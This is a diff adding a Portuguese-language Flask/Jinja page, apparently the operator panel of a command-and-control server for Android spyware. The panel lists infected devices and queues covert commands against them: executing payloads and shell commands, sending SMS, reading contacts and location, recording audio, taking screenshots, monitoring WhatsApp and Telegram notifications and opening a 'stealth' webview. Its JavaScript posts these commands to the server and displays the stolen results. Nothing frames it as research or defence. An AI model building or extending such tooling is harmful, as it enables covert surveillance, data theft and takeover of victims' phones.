@@ -1,0 +1,435 @@
+{% extends "base.html" %}
+
+{% block title %}Comandos - Sistema de Gerenciamento{% endblock %}
+
+{% block content %}
+<div class="d-flex justify-content-between align-items-center mb-4">
+    <h2><i class="fas fa-terminal"></i> Gerenciar Comandos</h2>
+    <div>
+        <button class="btn btn-primary" onclick="refreshCommands()">
+            <i class="fas fa-sync-alt"></i> Atualizar
+        </button>
+        <button class="btn btn-success" data-bs-toggle="modal" data-bs-target="#newCommandModal">
+            <i class="fas fa-plus"></i> Novo Comando
+        </button>
+    </div>
+</div>
+
+<div class="row">
+    <!-- Formulário de Comando Rápido -->
+    <div class="col-md-4">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-bolt"></i> Comando Rápido
+                </h5>
+            </div>
+            <div class="card-body">
+                <form id="quickCommandForm">
+                    <div class="mb-3">
+                        <label class="form-label">Dispositivo</label>
+                        <select class="form-select" name="device_id" required>
+                            <option value="">Selecione um dispositivo</option>
+                            {% for device in devices %}
+                                <option value="{{ device.device_id }}" 
+                                        {% if request.args.get('device') == device.device_id %}selected{% endif %}>
+                                    {{ device.model }} ({{ device.device_id[:8] }}...)
+                                </option>
+                            {% endfor %}
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Tipo de Comando</label>
+                        <select class="form-select" name="command_type" required onchange="updateCommandTemplate()">
+                            <option value="">Selecione o tipo</option>
+                            <option value="execute_payload">Executar Payload</option>
+                            <option value="get_device_info">Obter Informações</option>
+                            <option value="send_sms">Enviar SMS</option>
+                            <option value="monitor_notifications">Monitorar Notificações</option>
+                            <option value="stealth_webview">WebView Furtiva</option>
+                            <option value="update_config">Atualizar Configuração</option>
+                            <option value="download_file">Download de Arquivo</option>
+                            <option value="upload_file">Upload de Arquivo</option>
+                            <option value="execute_shell">Executar Shell</option>
+                            <option value="get_contacts">Obter Contatos</option>
+                            <option value="get_location">Obter Localização</option>
+                            <option value="record_audio">Gravar Áudio</option>
+                            <option value="take_screenshot">Capturar Tela</option>
+                        </select>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Dados do Comando</label>
+                        <textarea class="form-control" name="command_data" rows="6" 
+                                  placeholder='{"key": "value"}' id="commandData"></textarea>
+                        <small class="form-text text-muted">Use JSON válido para os parâmetros do comando</small>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Prioridade</label>
+                        <select class="form-select" name="priority">
+                            <option value="low">Baixa</option>
+                            <option value="normal" selected>Normal</option>
+                            <option value="high">Alta</option>
+                            <option value="critical">Crítica</option>
+                        </select>
+                    </div>
+                    <button type="button" class="btn btn-primary w-100" onclick="sendQuickCommand()">
+                        <i class="fas fa-paper-plane"></i> Enviar Comando
+                    </button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Templates de Comando -->
+        <div class="card mt-4">
+            <div class="card-header">
+                <h6 class="card-title mb-0">
+                    <i class="fas fa-code"></i> Templates
+                </h6>
+            </div>
+            <div class="card-body">
+                <div class="btn-group-vertical w-100">
+                    <button class="btn btn-outline-secondary btn-sm text-start" 
+                            onclick="loadTemplate('get_info')">
+                        <i class="fas fa-info-circle"></i> Informações do Dispositivo
+                    </button>
+                    <button class="btn btn-outline-secondary btn-sm text-start" 
+                            onclick="loadTemplate('send_sms')">
+                        <i class="fas fa-sms"></i> Enviar SMS
+                    </button>
+                    <button class="btn btn-outline-secondary btn-sm text-start" 
+                            onclick="loadTemplate('webview')">
+                        <i class="fas fa-globe"></i> WebView Furtiva
+                    </button>
+                    <button class="btn btn-outline-secondary btn-sm text-start" 
+                            onclick="loadTemplate('monitor')">
+                        <i class="fas fa-eye"></i> Monitorar Notificações
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lista de Comandos -->
+    <div class="col-md-8">
+        <div class="card">
+            <div class="card-header">
+                <h5 class="card-title mb-0">
+                    <i class="fas fa-list"></i> Comandos Recentes
+                </h5>
+            </div>
+            <div class="card-body p-0">
+                <div class="table-responsive">
+                    <table class="table table-hover mb-0">
+                        <thead>
+                            <tr>
+                                <th>ID</th>
+                                <th>Dispositivo</th>
+                                <th>Tipo</th>
+                                <th>Status</th>
+                                <th>Enviado</th>
+                                <th>Resultado</th>
+                                <th>Ações</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            {% for command in commands %}
+                            <tr>
+                                <td>
+                                    <small class="text-muted">{{ command.command_id[:8] }}...</small>
+                                </td>
+                                <td>
+                                    <div>{{ command.device_model }}</div>
+                                    <small class="text-muted">{{ command.device_id[:8] }}...</small>
+                                </td>
+                                <td>
+                                    <span class="badge bg-info">{{ command.command_type }}</span>
+                                </td>
+                                <td>
+                                    {% if command.status == 'pending' %}
+                                        <span class="badge bg-warning">Pendente</span>
+                                    {% elif command.status == 'sent' %}
+                                        <span class="badge bg-primary">Enviado</span>
+                                    {% elif command.status == 'executed' %}
+                                        <span class="badge bg-success">Executado</span>
+                                    {% elif command.status == 'failed' %}
+                                        <span class="badge bg-danger">Falhou</span>
+                                    {% else %}
+                                        <span class="badge bg-secondary">{{ command.status }}</span>
+                                    {% endif %}
+                                    {% if command.priority == 'high' %}
+                                        <span class="badge bg-danger ms-1">Alta</span>
+                                    {% elif command.priority == 'critical' %}
+                                        <span class="badge bg-dark ms-1">Crítica</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <small>{{ command.created_at.strftime('%d/%m %H:%M') }}</small>
+                                </td>
+                                <td>
+                                    {% if command.result %}
+                                        <button class="btn btn-sm btn-outline-info" 
+                                                onclick="showCommandResult('{{ command.command_id }}')">
+                                            <i class="fas fa-eye"></i>
+                                        </button>
+                                    {% else %}
+                                        <span class="text-muted">-</span>
+                                    {% endif %}
+                                </td>
+                                <td>
+                                    <div class="btn-group btn-group-sm">
+                                        {% if command.status == 'pending' %}
+                                            <button class="btn btn-outline-warning" 
+                                                    onclick="cancelCommand('{{ command.command_id }}')"
+                                                    title="Cancelar">
+                                                <i class="fas fa-times"></i>
+                                            </button>
+                                        {% endif %}
+                                        <button class="btn btn-outline-danger" 
+                                                onclick="deleteCommand('{{ command.command_id }}')"
+                                                title="Excluir">
+                                            <i class="fas fa-trash"></i>
+                                        </button>
+                                    </div>
+                                </td>
+                            </tr>
+                            {% else %}
+                            <tr>
+                                <td colspan="7" class="text-center text-muted py-4">
+                                    <i class="fas fa-terminal fa-3x mb-3"></i>
+                                    <h5>Nenhum comando encontrado</h5>
+                                    <p>Os comandos aparecerão aqui quando forem enviados.</p>
+                                </td>
+                            </tr>
+                            {% endfor %}
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- Estatísticas de Comandos -->
+        <div class="row mt-4">
+            <div class="col-md-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-primary">{{ stats.total_commands }}</h3>
+                        <small class="text-muted">Total</small>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-success">{{ stats.executed_commands }}</h3>
+                        <small class="text-muted">Executados</small>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-warning">{{ stats.pending_commands }}</h3>
+                        <small class="text-muted">Pendentes</small>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-3">
+                <div class="card text-center">
+                    <div class="card-body">
+                        <h3 class="text-danger">{{ stats.failed_commands }}</h3>
+                        <small class="text-muted">Falhas</small>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal de Resultado do Comando -->
+<div class="modal fade" id="commandResultModal" tabindex="-1">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Resultado do Comando</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <pre id="commandResultContent" class="bg-dark text-light p-3 rounded" style="max-height: 400px; overflow-y: auto;"></pre>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- Modal Novo Comando -->
+<div class="modal fade" id="newCommandModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h5 class="modal-title">Novo Comando</h5>
+                <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+            </div>
+            <div class="modal-body">
+                <form id="newCommandForm">
+                    <div class="mb-3">
+                        <label class="form-label">Nome do Comando</label>
+                        <input type="text" class="form-control" name="name" required 
+                               placeholder="Ex: Coletar Informações do Sistema">
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Descrição</label>
+                        <textarea class="form-control" name="description" rows="2"></textarea>
+                    </div>
+                    <div class="mb-3">
+                        <label class="form-label">Tipo</label>
+                        <select class="form-select" name="type" required>
+                            <option value="single">Comando Único</option>
+                            <option value="batch">Comando em Lote</option>
+                            <option value="scheduled">Agendado</option>
+                        </select>
+                    </div>
+                </form>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancelar</button>
+                <button type="button" class="btn btn-primary" onclick="createNewCommand()">Criar</button>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+    const commandTemplates = {
+        'get_info': '{}',
+        'send_sms': '{"number": "+5511999999999", "message": "Mensagem de teste"}',
+        'webview': '{"url": "https://example.com", "stealth": true}',
+        'monitor': '{"duration": 300, "apps": ["whatsapp", "telegram"]}'
+    };
+
+    function updateCommandTemplate() {
+        const commandType = document.querySelector('select[name="command_type"]').value;
+        const textarea = document.getElementById('commandData');
+        
+        if (commandTemplates[commandType]) {
+            textarea.value = commandTemplates[commandType];
+        } else {
+            textarea.value = '{}';
+        }
+    }
+
+    function loadTemplate(templateName) {
+        if (commandTemplates[templateName]) {
+            document.getElementById('commandData').value = commandTemplates[templateName];
+        }
+    }
+
+    function sendQuickCommand() {
+        const form = document.getElementById('quickCommandForm');
+        const formData = new FormData(form);
+        
+        let commandData;
+        try {
+            commandData = JSON.parse(formData.get('command_data') || '{}');
+        } catch (e) {
+            showNotification('JSON inválido nos dados do comando', 'danger');
+            return;
+        }
+        
+        fetch('/api/command', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                device_id: formData.get('device_id'),
+                command_type: formData.get('command_type'),
+                data: commandData,
+                priority: formData.get('priority')
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.command_id) {
+                showNotification('Comando enviado com sucesso! ID: ' + data.command_id, 'success');
+                form.reset();
+                setTimeout(() => location.reload(), 1000);
+            } else {
+                showNotification('Erro ao enviar comando: ' + data.error, 'danger');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            showNotification('Erro de conexão', 'danger');
+        });
+    }
+
+    function showCommandResult(commandId) {
+        fetch(`/api/command/${commandId}`)
+            .then(response => response.json())
+            .then(command => {
+                const resultContent = document.getElementById('commandResultContent');
+                resultContent.textContent = JSON.stringify(command.result, null, 2);
+                $('#commandResultModal').modal('show');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                showNotification('Erro ao carregar resultado', 'danger');
+            });
+    }
+
+    function cancelCommand(commandId) {
+        if (confirm('Cancelar este comando?')) {
+            fetch(`/api/command/${commandId}/cancel`, { method: 'POST' })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        showNotification('Comando cancelado', 'success');
+                        location.reload();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showNotification('Erro ao cancelar comando', 'danger');
+                });
+        }
+    }
+
+    function deleteCommand(commandId) {
+        if (confirm('Excluir este comando?')) {
+            fetch(`/api/command/${commandId}`, { method: 'DELETE' })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === 'success') {
+                        showNotification('Comando excluído', 'success');
+                        location.reload();
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    showNotification('Erro ao excluir comando', 'danger');
+                });
+        }
+    }
+
+    function refreshCommands() {
+        location.reload();
+    }
+
+    function createNewCommand() {
+        // Implementar criação de novo comando template
+        $('#newCommandModal').modal('hide');
+        showNotification('Funcionalidade em desenvolvimento', 'info');
+    }
+
+    // Auto-selecionar dispositivo se veio da URL
+    document.addEventListener('DOMContentLoaded', function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        const deviceId = urlParams.get('device');
+        if (deviceId) {
+            const select = document.querySelector('select[name="device_id"]');
+            select.value = deviceId;
+        }
+    });
+</script>
+{% endblock %}
